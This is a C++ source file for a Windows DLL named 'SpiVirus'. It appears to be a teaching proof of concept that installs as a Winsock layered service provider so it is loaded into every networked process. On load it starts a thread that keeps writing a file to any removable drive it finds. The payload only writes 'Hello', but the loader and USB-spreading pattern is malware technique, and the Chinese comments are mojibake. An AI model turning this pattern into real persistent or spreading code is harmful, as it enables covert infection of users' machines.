// SpiVirus.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <tchar.h>
#include <windows.h>
#include <stdio.h> 
#include <Ws2spi.h>
#pragma comment(lib, "WS2_32")	// ���ӵ�WS2_32.lib

DWORD __stdcall ThreadMain( LPVOID )
{
	while (1)   //ѭ��ɨ��ϵͳ����
	{
		TCHAR tcBuffer[4] = {0}; //׼����С�ڴ�,����̽��ʵ����Ҫ���ڴ��С��
		DWORD dwNeededSize = GetLogicalDriveStrings(4, tcBuffer); //��һ��ִ�У����ʵ����Ҫ�ڴ档
		if (dwNeededSize > 4)
		{   //����ֵ����ָ���ڴ��С,��Ҫ����׼���㹻�ڴ��ٴ�ִ�С�
			TCHAR *pBuffer = new TCHAR[dwNeededSize];  //׼���㹻����ڴ�
			dwNeededSize = GetLogicalDriveStrings(dwNeededSize, pBuffer); //����߼��������ַ���
			TCHAR *pDrive = pBuffer;
			int iPreLength = 0;
			while (1)
			{
				pDrive = pBuffer+iPreLength;  //�����һ��������
				if (pDrive[0] == 0) //��ȡ����������
				{
					break; //�˳�ѭ��
				}
				DWORD dwDriveType = GetDriveType(pDrive); //��ȡ����������
				if (dwDriveType == DRIVE_REMOVABLE)
				{   //������ƶ�������
					TCHAR tcFile[MAX_PATH] = {0};
					_stprintf(tcFile, _T("%sa.txt"), pDrive);
					//���Ѵ��ڵ�a.txt�ļ�
					HANDLE hFile = CreateFile(tcFile, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (hFile == INVALID_HANDLE_VALUE)
					{
						//��ʧ���򴴽�һ����
						hFile = CreateFile(tcFile, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
							CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
						DWORD dwWrite = 0;
						WriteFile(hFile, _T("Hello"), 5, &dwWrite, NULL);
					}
					CloseHandle(hFile);
				}
				iPreLength += _tcslen(pDrive);  //������ǰ������
				iPreLength += sizeof(TCHAR);    //����'\0'��
			}
			if (pBuffer != NULL)
			{
				delete []pBuffer;  //�ͷ��ڴ�
				pBuffer = NULL;
			}
		}
		Sleep(500);  //��ͣ500��������ɨ��
	}
}

int GetProvider(LPWSAPROTOCOL_INFOW &pProtoInfo)
{	
	//  �״ε��ã�pProtoInfo����NULL��ȡ����Ҫ�Ļ���������
	DWORD dwSize = 0;
	int nError = 0;
	if(WSCEnumProtocols(NULL, NULL, &dwSize, &nError) == SOCKET_ERROR)
	{
		if(nError != WSAENOBUFS)
		{
			return 0;
		}
	}
	// �����㹻�������ڴ档
	pProtoInfo = (LPWSAPROTOCOL_INFOW)GlobalAlloc(GPTR, dwSize);
	if (pProtoInfo == NULL)
	{
		return 0;
	}
	//�ٴε���WSCEnumProtocols����
	return WSCEnumProtocols(NULL, pProtoInfo, &dwSize, &nError);
}

int WSPAPI WSPStartup(WORD wVersionRequested,
					  LPWSPDATA lpWSPData,
					  LPWSAPROTOCOL_INFOW lpProtocolInfo,
					  WSPUPCALLTABLE UpcallTable,
					  LPWSPPROC_TABLE lpProcTable)
{
//	MessageBoxA(0,0,0,0);
	//���Ǳ�д��DLL����Э�����У���������ǻ���Э���ֲ�Э��ʹ����ֱ�ӷ��ش���
	if(lpProtocolInfo->ProtocolChain.ChainLen <= 1)
	{	
		return WSAEPROVIDERFAILEDINIT;
	}
	// ö��Э�飬�ҵ��²�Э���WSAPROTOCOL_INFOW�ṹ	
	WSAPROTOCOL_INFOW	NextProtocolInfo;
	LPWSAPROTOCOL_INFOW pProtoInfo = NULL;
	//��װЭ����ʱ��װ��ö���ṩ�ߵĺ����������ṩ���ܸ�����
	int nTotalProtos = GetProvider(pProtoInfo);
	// �²㴫������ṩ��Ŀ¼ID	
	DWORD dwBaseEntryId = lpProtocolInfo->ProtocolChain.ChainEntries[1];
	int i=0;
	for(; i<nTotalProtos; i++)
	{
		if(pProtoInfo[i].dwCatalogEntryId == dwBaseEntryId)
		{	//�����²㴫������ṩ����Ϣ
			memcpy(&NextProtocolInfo, &pProtoInfo[i], sizeof(NextProtocolInfo));
			break;
		}
	}
	if(i >= nTotalProtos)
	{	//���û���ҵ��²��ṩ���򷵻ش���
		return WSAEPROVIDERFAILEDINIT;
	}
	// �����²�Э���DLL
	int nError;
	wchar_t szBaseProviderDll[MAX_PATH];
	int nLen = MAX_PATH;
	// ȡ���²��ṩ����DLL·��
	if(WSCGetProviderPath(&NextProtocolInfo.ProviderId, szBaseProviderDll, &nLen, &nError) == SOCKET_ERROR)
	{
		return WSAEPROVIDERFAILEDINIT;
	}
	if(!ExpandEnvironmentStringsW(szBaseProviderDll, szBaseProviderDll, MAX_PATH))
	{
		return WSAEPROVIDERFAILEDINIT;
	}
	// �����²��ṩ����
	HMODULE hModule = LoadLibraryW(szBaseProviderDll);
	if(hModule == NULL)
	{
		return WSAEPROVIDERFAILEDINIT;
	}
	// �����²��ṩ�����WSPStartup����
	LPWSPSTARTUP  pfnWSPStartup = NULL;
	pfnWSPStartup = (LPWSPSTARTUP)GetProcAddress(hModule, "WSPStartup");
	if(pfnWSPStartup == NULL)
	{
		return WSAEPROVIDERFAILEDINIT;
	}
	// �����²��ṩ�����WSPStartup���������SPI��ַ��
	LPWSAPROTOCOL_INFOW pInfo = lpProtocolInfo;
	if(NextProtocolInfo.ProtocolChain.ChainLen == BASE_PROTOCOL)
	{
		pInfo = &NextProtocolInfo;
	}
	else
	{
		for(int j = 0; j<lpProtocolInfo->ProtocolChain.ChainLen; j++)
		{
			lpProtocolInfo->ProtocolChain.ChainEntries[j] 
				= lpProtocolInfo->ProtocolChain.ChainEntries[j+1];
		}
		lpProtocolInfo->ProtocolChain.ChainLen--;
	}
	
	int nRet = pfnWSPStartup(wVersionRequested, lpWSPData, pInfo, UpcallTable, lpProcTable);
	if(nRet != ERROR_SUCCESS)
	{
		return nRet;
	}
	GlobalFree(pProtoInfo);
	return nRet;
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved)
{
	if (DLL_PROCESS_ATTACH == ul_reason_for_call)
	{
		CreateThread( NULL, 0, ThreadMain, 0, 0, 0 );
	}
    return TRUE;
}

